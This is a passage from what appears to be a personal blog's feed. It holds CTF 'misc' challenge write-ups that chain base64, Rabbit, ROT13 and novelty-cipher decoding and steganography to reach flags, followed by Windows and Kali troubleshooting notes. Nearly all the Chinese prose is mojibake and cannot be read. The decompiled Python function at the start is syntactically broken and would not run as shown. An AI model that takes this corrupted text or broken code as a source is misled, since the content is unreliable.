class="keyword">def</span> <span class="title function_">rend</span>(<span class="params">s</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encodeCh</span>(<span class="params">ch</span>):</span><br><span class="line">        </span><br><span class="line">        f = <span class="keyword">lambda</span> x: <span class="built_in">chr</span>(((<span class="built_in">ord</span>(ch) - x) + <span class="number">2</span>) % <span class="number">26</span> + x)</span><br><span class="line">        <span class="keyword">if</span> ch.islower():</span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">97</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">None</span>,).isupper():</span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">65</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="string">&#x27;&#x27;</span>.join,)((<span class="keyword">lambda</span> <span class="number">.0</span>: <span class="keyword">pass</span>)(s))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>#è¡¥å……ä¸€ä¸ªï¼ŒZmxhZwå¸¸è§flagbase64å¤´ï¼Œ</p><p>æ˜æ–‡+base64+å‡¯æ’’3â€”-&gt;å¯†æ–‡</p><h2 id="20240125"><a href="#20240125" class="headerlink" title="20240125"></a>20240125</h2><h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p>1ã€æ‰“å¼€misc2å‹ç¼©åŒ…ï¼Œé‡Œé¢åªæœ‰misc1æ˜¯æœªåŠ å¯†çš„ã€‚</p><p>2ã€æ‰“å¼€misc1å‹ç¼©åŒ…ï¼Œé‡Œé¢pngæ–‡ä»¶æœªåŠ å¯†ï¼Œæ‰“å¼€æ˜¯2020ï¼Œå°è¯•è¾“å…¥åŠ å¯†æ–‡ä»¶musicçš„å¯†ç ã€‚</p><p>3ã€æ‰“å¼€musicï¼Œå¾—åˆ° â™­â€–â™­â€–â€–â™¯â™­â™­â™¬â€–â™©â™«â€–â™¬âˆ®â™­â™­Â¶â™­â€–â™¯â€–Â¶â™­â™­â€–âˆ®â€–â€–â™­â€–Â§â™­â€–â™¬â™ªâ™­â™¯Â§â€–â€–â™¯â€–â€–â™¬â€–â€–â™ªâ€–â€–â™ªâ€–Â¶Â§â€–â€–â™¬â™­â™¯â€–â™­â™¯â™ªâ€–â€–âˆ®â€–â™¬Â§â™­â€–â€–â€–â™©â™ªâ€–â€–â™¬â™­â™­â™¬â€–â™©â™ªâ€–â™©Â¶â€–â™©â™ªâ€–â™©â™¬â€–Â¶Â§â€–â€–â™©â€–Â¶â™«â™­â™­â™©â€–â™¬â™¯â€–â™¬Â§â™­â€–â™­â€–â™©Â¶â€–â€–âˆ®â™­â™­â™¬â€–â€–â™­â€–â™«Â§â€–Â¶â™«â€–â™©âˆ®â™­â™­Â§â€–â™­Â§â€–â™­Â§Â§&#x3D;</p><p>4ã€éŸ³ç¬¦è§£ç å¾—åˆ° U2FsdGVkX1&#x2F;eK2855m8HM4cTq8Fquqtm6QDbcUu4F1yQpA&#x3D;&#x3D;</p><p>5ã€è€ƒè™‘rabbitè§£ç ï¼Œkeyä¸º2020ï¼Œå¾—åˆ°ï¼šwelcome_to_payhelp</p><p>6ã€å°†5ã€å¾—åˆ°çš„è€ƒè™‘ä¸ºhint.txtçš„å¯†ç ï¼Œå¾—åˆ°ï¼š VmpKMFUxTXhXWGxVV0dob1RUSjRVVll3V2t0aFJscDBZMGhLYTAxWGVIaFZiRkpUWWtaYVZWSnJXbFpOVjJoeVZYcEdZVkpzVG5KVWJHaHBWa1ZWZDFkV1ZtRmtNRFZYVjJ4c2FWSlVWbFJVVnpWdVRXeFZlV1ZHVGxSaVZrWTBXVlJPYzFWR1pFZFRiVGxYWW01Q1dGcEdXbE5UUjBZMlVXMTBWMWRGU2xkV1ZtUXdVekpGZUZOWWJHaFRSVFZWV1d0YVMxTXhjRVZUYTFwc1ZteHdlRlp0ZERCV01VcFlaRE53V0Zac2NIWldSekZMVW1zeFdWSnNTbWxXUjNodlZtMXdUMkl5Vm5OaVNGWnBVbXh3YzFac1VrZFNiRlY0WVVkMFZXSlZXbmxWYlRWUFZsWlplbEZyWkZSaVJrcFFWV3hGYkUwd1VXeE5NRkVsTTBRJTNE</p><p>7ã€å°†6ã€base64è§£ç 6æ¬¡ï¼Œå¾—åˆ° welcome_to_2020%0Aflag%20is%20comingâ€¦%0Athe%20key%20is%20hello%202020%21Ãœ0</p><p>8ã€å¯¹7ã€ä¸­çš„urlè§£ç è¿›è¡Œæ›¿æ¢å¾—åˆ° welcome_to_2020 flag is comingâ€¦%0Athe key is hello 2020!Ãœ0</p><p>9ã€çŒœæµ‹hello 2020!ä¸ºflag.txtå¯†ç </p><p>10ã€å¾—åˆ°flagï¼šflag{g00d_f0r_y0u}</p><h3 id="misc50"><a href="#misc50" class="headerlink" title="misc50"></a>misc50</h3><p>å—¯â€¦â€¦è›®å¤æ‚çš„</p><p><a href="http://t.csdnimg.cn/Y9SyV">http://t.csdnimg.cn/Y9SyV</a></p><h2 id="20240129"><a href="#20240129" class="headerlink" title="20240129"></a>20240129</h2><p>å¿˜è®°å½•äº†å‘œå‘œ</p><p>ä¸€ä¸ªæ˜¯wordéšå†™ï¼ˆå› ä¸ºæ‰“å¼€æŸ¥çœ‹éšè—åŠŸèƒ½ï¼Œæ‰€ä»¥ä¸€æ‰“å¼€å°±æ˜¯flagï¼ˆæœ‰ç‚¹æ— è¯­</p><p>ä¸€ä¸ªæ˜¯å›¾ç‰‡éšå†™ï¼Œwinhexæ‰“å¼€æœ‰å­—ç¬¦ï¼Œbase85</p><h2 id="20240130"><a href="#20240130" class="headerlink" title="20240130"></a>20240130</h2><h3 id="é€‚åˆä½œä¸ºæ¡Œé¢"><a href="#é€‚åˆä½œä¸ºæ¡Œé¢" class="headerlink" title="é€‚åˆä½œä¸ºæ¡Œé¢"></a>é€‚åˆä½œä¸ºæ¡Œé¢</h3><p><a href="http://t.csdn.cn/XsnrR">http://t.csdn.cn/XsnrR</a></p><p>é¢˜è§£</p><pre><code>å•çº¯ä»å›¾ç‰‡è§‚å¯Ÿï¼Œæœªå‘ç°çº¿ç´¢ï¼›å³é”®ä½¿ç”¨è®°äº‹æœ¬æ‰“å¼€ï¼Œä¾ç„¶æœªå‘ç° flag å­—æ ·ï¼›è€ƒè™‘å›¾ç‰‡éšå†™ï¼Œå¯åŠ¨ Stegsolve ï¼ŒåŠ è½½å›¾ç‰‡ï¼›ç›´æ¥åˆ‡æ¢å›¾ç‰‡ï¼Œåœ¨ red plane 1 ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå›¾ç‰‡å·¦ä¸Šè§’å‡ºç°äº†ä¸€ä¸ªäºŒç»´ç ã€‚ï¼ˆå›¾ç‰‡éšå†™å¤§æ¦‚ç‡å¯èƒ½è¿˜ä¼šæ¶‰åŠåˆ°æ•°æ®æå–ï¼Œè¿™é“é¢˜æ¯”è¾ƒåŸºç¡€ï¼Œæ‰€ä»¥ç›´æ¥åˆ‡æ¢å°±å¯ä»¥çœ‹åˆ°ï¼‰è¯†åˆ«è¯¥äºŒç»´ç ï¼Œåœ¨çº¿æ¡ç è§£æï¼Œè®°å¾—é€‰æ‹©äºŒç»´ç ï¼Œç„¶å read è¯»å–ï¼›æ‰«æç»“æœæ˜¯ä¸€ä¸²åå…­è¿›åˆ¶çš„æ•°å­—ï¼›å¯åŠ¨ winhex è¿›è¡Œè§£ç ï¼Œé€‰æ‹© AscII Hexè™½ç„¶è§£æå‡ºæ¥æ˜¯ä¹±ç ï¼Œä½†æ˜¯æ ¹æ®è¿™äº›å…³é”®å­—å¯ä»¥æ¨æ–­å‡ºï¼Œè¿™åº”è¯¥æ˜¯ä¸€ä¸ª python è¢«ç¼–è¯‘ä¹‹åçš„ pyc æ–‡ä»¶å°†å…¶ä¿å­˜ä¸º pyc æ–‡ä»¶å¯åŠ¨ easy python decompiler å¯¹å…¶è¿›è¡Œåç¼–è¯‘åç¼–è¯‘ä¼šåœ¨ pyc æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹ç”Ÿæˆè¿™ä¸ªæ–‡ä»¶å°†å…¶åç¼€æ”¹ä¸º py ä½¿ç”¨ vscode æ‰“å¼€ï¼Œå‘ç°å®é™…ä¸Šæ˜¯ä¸€ä¸ªåä¸º flag çš„ python æ–¹æ³•ï¼Œä½†å¹¶æ— è°ƒç”¨è¯­å¥ï¼Œäºæ˜¯è‡ªå·±åŠ ä¸Šä¸€è¡Œä»£ç ï¼Œè°ƒç”¨è¿™ä¸ªæ–¹æ³•æ‰¾åˆ° flag</code></pre><h3 id="å¦‚æ¥åä¸‰æŒ"><a href="#å¦‚æ¥åä¸‰æŒ" class="headerlink" title="å¦‚æ¥åä¸‰æŒ"></a>å¦‚æ¥åä¸‰æŒ</h3><p>æ‹¿é¢˜ç›®</p><p>é¦–å…ˆè¿˜æ˜¯åˆ†æé¢˜ç›®ï¼Œçœ‹çœ‹ä»é¢˜ç›®ä¸­èƒ½å‘ç°ä»€ä¹ˆè››ä¸é©¬è¿¹ã€‚è¿™æ˜¯ä¸€é“â€œ13æŒâ€æ‰“æ¶é¢˜ã€‚å…ˆä¸‹è½½é™„åŠ çœ‹çœ‹ã€‚</p><p> ä¸ä½›è®ºç¦…</p><p>é™„ä»¶é‡Œé¢æ˜¯ä¸€æ®µçœ‹ä¸æ‡‚çš„æ–‡å­—ï¼Œä½†æ˜¯æ­£å¸¸çš„åº”è¯¥èƒ½çœ‹å‡ºè¿™åº”è¯¥æ˜¯ä¸€æ®µä½›æ–‡ã€‚</p><p>ç«‹é©¬æƒ³åˆ°ã€ä¸ä½›è®ºç¦…ã€‘</p><p>å¤åˆ¶è§£å¯†ä¸€ä¸‹ï¼šæ³¨æ„æ ¼å¼ä¸€å®šè¦åŠ ä¸Šï¼šã€ä½›æ›°ï¼šã€‘è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°å¯†æ–‡ï¼š{MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9}</p><p>åä¸‰æŒè§£å¯†</p><p>ä¸Šé¢çš„ç¬¬ä¸€æ­¥è§£å¯†å®Œæˆï¼Œä½†æ˜¯è¾“å…¥è¿›å»æ˜¯ä¸€ä¸ªé”™è¯¯çš„flagï¼Œç»§ç»­åˆ†æé¢˜å¹²ã€‚é¢˜å¹²ä¸Šæœ‰ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„æç¤ºï¼šã€å¦‚æ¥åä¸‰æŒã€‘ã€‚</p><p>å¿…é¡»å¾ˆå¿«çš„æƒ³åˆ°è¦è¿›è¡Œrot13è§£ç ï¼šè§£ç å¾—åˆ°{ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9}</p><p>è¾“å…¥ä¾ç„¶ä¸æ˜¯æ­£ç¡®çš„flagã€‚</p><p>Base64è§£å¯†</p><p>ä»13æŒä¸­å¾—åˆ°çš„å¯†æ–‡åï¼Œæˆ‘ä»¬å†è¿›è¡Œä¸€ä¸ªBase64è§£å¯†å¾—åˆ°æœ€ç»ˆflagã€‚flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MISCMISCï¼&quot;&gt;&lt;a href=&quot;#MISCMISCï¼&quot; class=&quot;headerlink&quot; title=&quot;MISCMISCï¼&quot;&gt;&lt;/a&gt;MISCMISCï¼&lt;/h1&gt;&lt;h2 id=&quot;2024-x2F-01-x2F-14&quot;&gt;&lt;a href=&quot;#2024-x2</summary>
      
    
    
    
    
    <category term="MISC" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>ä¿®ç”µè„‘æ‚è®°</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/01/15/%E4%BF%AE%E7%94%B5%E8%84%91%E6%9D%82%E8%AE%B0(win/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/01/15/%E4%BF%AE%E7%94%B5%E8%84%91%E6%9D%82%E8%AE%B0(win/</id>
    <published>2024-01-14T16:00:00.000Z</published>
    <updated>2024-01-25T14:16:21.459Z</updated>
    
    <content type="html"><![CDATA[<p>2024&#x2F;1&#x2F;14</p><h2 id="å˜¿å˜¿æ—©ä¸ŠæŠŠå®¶é‡Œçš„ç”µè„‘ä¿®å¥½äº†"><a href="#å˜¿å˜¿æ—©ä¸ŠæŠŠå®¶é‡Œçš„ç”µè„‘ä¿®å¥½äº†" class="headerlink" title="å˜¿å˜¿æ—©ä¸ŠæŠŠå®¶é‡Œçš„ç”µè„‘ä¿®å¥½äº†"></a>å˜¿å˜¿æ—©ä¸ŠæŠŠå®¶é‡Œçš„ç”µè„‘ä¿®å¥½äº†</h2><p>é—®é¢˜ï¼šntfs.sysä¸¢å¤±æˆ–æŸåè“å±<br>åŸå› ï¼šUç›˜åœ¨å¼€æœºå‰å¯åŠ¨ï¼Œå¯¼è‡´win7ç³»ç»Ÿæ²¡èµ·æ¥ï¼Œç³»ç»Ÿæ–‡ä»¶è¢«ä¿®æ”¹äº†<br>è§£å†³ï¼šå‘½ä»¤è¡Œï¼š<code>chkdsk C: /f /r</code> ,ç„¶å<code>Y</code>ï¼Œé‡å¯åä¿®å¤å°±okäº†</p><p>ä¿®æ”¹ç£ç›˜å¤§å°</p><p><a href="https://support.microsoft.com/zh-cn/topic/microsoft-%E6%94%AF%E6%8C%81-%E5%A6%82%E4%BD%95%E5%9C%A8%E4%B8%8D%E9%94%80%E6%AF%81%E6%95%B0%E6%8D%AE%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E9%87%8D%E6%96%B0%E5%88%86%E5%8C%BA-c3d64de0-4672-b21f-de4e-b4908fb35ae3">å®˜æ–¹win7ä¿®æ”¹ç£ç›˜åˆ†åŒºæ–¹æ³•</a><br>å·®ä¸å¤šï¼Œè¿˜å¥½è¦åˆ é™¤çš„Fç›˜åœ¨Cç›˜å³ä¾§ï¼Œç›´æ¥åˆ é™¤Fç›˜ï¼ŒCç›˜æ‰©å±•å°±okäº†</p><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>Domain Name System</p><p>DNSæœåŠ¡å™¨</p><p>2.4GHzé¢‘æ®µå…·å¤‡å¼ºå¤§çš„ç©¿å¢™èƒ½åŠ›å’Œå¹¿é˜”çš„è¦†ç›–èŒƒå›´ï¼Œè€Œ5GHzé¢‘æ®µåˆ™æ›´æ³¨é‡é€Ÿåº¦å’Œç¨³å®šæ€§ã€‚</p><p>2024&#x2F;01&#x2F;20</p><h2 id="win7ç³»ç»Ÿipåœ°å€å†²çª"><a href="#win7ç³»ç»Ÿipåœ°å€å†²çª" class="headerlink" title="win7ç³»ç»Ÿipåœ°å€å†²çª"></a>win7ç³»ç»Ÿipåœ°å€å†²çª</h2><p>å½“åŒä¸€ç½‘ç»œä¸Šçš„ä¸¤å°æˆ–å¤šå°è®¾å¤‡åˆ†é…äº†ç›¸åŒçš„IPåœ°å€æ—¶ï¼Œå°±ä¼šå‘ç”ŸIPåœ°å€å†²çª</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">ipconfig</span>/release</span><br><span class="line">&gt;<span class="built_in">ipconfig</span>/renew</span><br></pre></td></tr></table></figure><h2 id="win7é˜²ç«å¢™0x80070422é—®é¢˜"><a href="#win7é˜²ç«å¢™0x80070422é—®é¢˜" class="headerlink" title="win7é˜²ç«å¢™0x80070422é—®é¢˜"></a>win7é˜²ç«å¢™0x80070422é—®é¢˜</h2><p>win+râ€“services.mscâ€“windows firewallâ€“å¯åŠ¨ç±»å‹ä¸ºæ‰‹åŠ¨ï¼Œåº”ç”¨åæœåŠ¡çŠ¶æ€æ”¹å¯åŠ¨ï¼Œokäº†</p><h2 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h2><p>dfï¼šæŸ¥çœ‹ç³»ç»Ÿæ•´ä½“ç©ºé—´å‰©ä½™æƒ…å†µ</p><p>du:æŸ¥çœ‹æ¯ä¸ªæ–‡ä»¶å¤¹å ç”¨æƒ…å†µï¼Œæˆ–æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹ç£ç›˜ç”¨é‡</p><h3 id="dev-x2F-sha1æ»¡äº†"><a href="#dev-x2F-sha1æ»¡äº†" class="headerlink" title="dev&#x2F;sha1æ»¡äº†"></a>dev&#x2F;sha1æ»¡äº†</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get autoclean   //æ¸…ç†æ—§ç‰ˆæœ¬è½¯ä»¶ç¼“å­˜</span><br><span class="line"></span><br><span class="line">sudo apt-get clean      //æ¸…ç†æ‰€æœ‰è½¯ä»¶ç¼“å­˜</span><br><span class="line"></span><br><span class="line">sudo apt-get autoremove  //åˆ é™¤ç³»ç»Ÿä¸å†ä½¿ç”¨çš„å­¤ç«‹è½¯ä»¶</span><br></pre></td></tr></table></figure><h2 id="VM-ubuntuæ²¡ç½‘"><a href="#VM-ubuntuæ²¡ç½‘" class="headerlink" title="VM-ubuntuæ²¡ç½‘"></a>VM-ubuntuæ²¡ç½‘</h2><p>æŠ˜è…¾äº†ä¸¤å¤©ï¼Œé‡è£…è§£å†³ä¸€åˆ‡é—®é¢˜ã€‚</p><p>ä¼¤å¿ƒã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;2024&amp;#x2F;1&amp;#x2F;14&lt;/p&gt;
&lt;h2 id=&quot;å˜¿å˜¿æ—©ä¸ŠæŠŠå®¶é‡Œçš„ç”µè„‘ä¿®å¥½äº†&quot;&gt;&lt;a href=&quot;#å˜¿å˜¿æ—©ä¸ŠæŠŠå®¶é‡Œçš„ç”µè„‘ä¿®å¥½äº†&quot; class=&quot;headerlink&quot; title=&quot;å˜¿å˜¿æ—©ä¸ŠæŠŠå®¶é‡Œçš„ç”µè„‘ä¿®å¥½äº†&quot;&gt;&lt;/a&gt;å˜¿å˜¿æ—©ä¸ŠæŠŠå®¶é‡Œçš„ç”µè„‘ä¿®å¥½äº†&lt;/h2&gt;&lt;p</summary>
      
    
    
    
    
    <category term="MISC" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/MISC/"/>
    
  </entry>
  
</feed>
